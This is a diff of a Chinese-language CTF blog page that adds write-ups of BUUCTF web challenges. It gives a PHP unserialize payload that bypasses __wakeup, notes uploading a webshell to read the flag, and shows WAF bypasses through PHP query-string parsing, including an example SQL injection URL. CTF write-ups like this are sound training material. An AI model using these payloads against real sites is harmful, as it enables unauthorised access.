@@ -184,13 +184,13 @@
       <div class="col-xl-6"><article class="article">
   <div class="wrap">
     <section class="head">
-  <img   class="lazyload" data-original="/images/theme/post-image8.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <img   class="lazyload" data-original="/images/theme/post-image6.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
   <div class="head-mask">
     <h1 class="head-title">buu1-web</h1>
     <div class="head-info">
       <span class="post-info-item"><i class="iconfont iconcalendar"></i>January 13, 2022</span>
       
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>11245</span>
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>10683</span>
     </div>
   </div>
 </section>
@@ -400,7 +400,7 @@
 <p>我收起这个想法</p>
 <p>直接写算了</p>
 <p><img   class="lazyload" data-original="/2022/01/13/buu1-web/image-20220206210555010.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">image-20220206210555010</span></p>
-被过滤了，那换一种写法
+<?被过滤了，那换一种写法
 
 尝试访问，无法执行
 
@@ -421,6 +421,125 @@
 ![image-20220206223818978](buu1-web/image-20220206223818978.png)
 
 ![image-20220206223925673](buu1-web/image-20220206223925673.png)
+
+# [极客大挑战 2019]PHP
+
+![image-20220313160154328](buu1-web/image-20220313160154328.png)
+
+是可爱猫猫~~~，提到了备份就可以考虑一下源码泄露，扫一下可以得到www.zip，（buu疯狂ban我）
+
+![image-20220313160531929](buu1-web/image-20220313160531929.png)
+
+![image-20220313160552517](buu1-web/image-20220313160552517.png)
+
+![image-20220313161147279](buu1-web/image-20220313161147279.png)
+
+考的是序列化与反序列化，这里get传参参数用的是select,然后这里需要构造一个Name的类，username为admin，password为100
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>	<span class="hljs-keyword">private</span> $username;<br>	<span class="hljs-keyword">private</span> $password;<br><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$username,  $password</span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-keyword">$this</span>-&gt;username = $username;<br>		<span class="hljs-keyword">$this</span>-&gt;password = $password;<br>	&#125;<br><br>&#125;<br>$user = <span class="hljs-keyword">new</span> Name(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-number">100</span>);<br>var_dump(serialize($user)); <span class="hljs-comment">//string(77) &quot;O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table>
+
+然而这样并不足以绕过，可以将序列化的Name对象作为select参数的值提交。当执行反序列化之后，又恢复成Name对象，并且，在Name对象销毁时，会自动调用`__destruct()`方法。
+
+当时这里用个问题，就是在执行`__destruct()`方法之前，可能会先执行wakeup()方法，并且在**`wakeup()`会修改username的值**。
+
+因此，这里**应该绕过wakeup()方法**，避免`wakeup()`执行。
+
+在不想执行 __wakeup() 的时候，可以让序列化结果中类属性的数值大于其真正的数值进行绕过，这个方式适用于PHP < 5.6.25 和 PHP< 7.0.10。
+
+那这里把2改成3
+
+最后的payload如下：
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/?select=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Nameusername&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;i:<span class="hljs-number">100</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+参考链接：
+
+https://zhuanlan.zhihu.com/p/366455343
+
+https://blog.csdn.net/qq_45927266/article/details/120380343
+
+# [极客大挑战 2019]BabySQL
+
+![image-20220313163626724](buu1-web/image-20220313163626724.png)
+
+![image-20220313164052931](buu1-web/image-20220313164052931.png)
+
+![image-20220313164506955](buu1-web/image-20220313164506955.png)
+
+![image-20220313165039532](buu1-web/image-20220313165039532.png)
+
+![image-20220313165116686](buu1-web/image-20220313165116686.png)
+
+![image-20220313165301926](buu1-web/image-20220313165301926.png)
+
+# [ACTF2020 新生赛]Upload
+
+![image-20220314180239742](buu1-web/image-20220314180239742.png)
+
+上传一张图片以后，可以得到存储目录以及上传后的图片名字
+
+/uplo4d 不让直接访问，但是这不是很影响
+
+![image-20220314182257027](buu1-web/image-20220314182257027.png)
+
+![image-20220314192724307](buu1-web/image-20220314192724307.png)
+
+~~少了个？，小声~~
+
+![image-20220314193050215](buu1-web/image-20220314193050215.png)
+
+![image-20220314193255727](buu1-web/image-20220314193255727.png)
+
+又到了传马，cat /flag的环节,没了
+
+# [RoarCTF 2019]Easy Calc
+
+![image-20220321213019871](buu1-web/image-20220321213019871.png)
+
+习惯f12，发现有waf，过waf的话需要危险传参
+
+![image-20220321213341965](buu1-web/image-20220321213341965.png)
+
+calc.php引起注意，打开看看
+
+![image-20220321213551464](buu1-web/image-20220321213551464.png)
+
+有点东西，过滤了一堆字符，参数是num，第一个就是过滤空格，那这里可以通过 num（就是num前面加一个空格完成传参，由于/ ，''被过滤了这里可以通过chr(47)进行绕过
+
+![image-20220321215049946](buu1-web/image-20220321215049946.png)
+
+补充：var_dump() :打印变量的相关信息      scandir()：列出文件目录，访问f1agg
+
+![image-20220321221751130](buu1-web/image-20220321221751130.png)
+
+file_get_contents()读取文件内容
+
+
+
+
+
+PHP的字符串解析特性
+这是别人对PHP字符串解析漏洞的理解，
+我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] => “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] => 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：
+
+/news.php?%20news[id%00=42"+AND+1=0–
+
+上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。
+
+HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：
+
+1.删除空白符
+
+2.将某些字符转换为下划线（包括空格）
+
+
+
+
+
+
+
+参考链接：https://blog.csdn.net/weixin_44077544/article/details/102630714
+
 
       </section>
       <section class="extra">
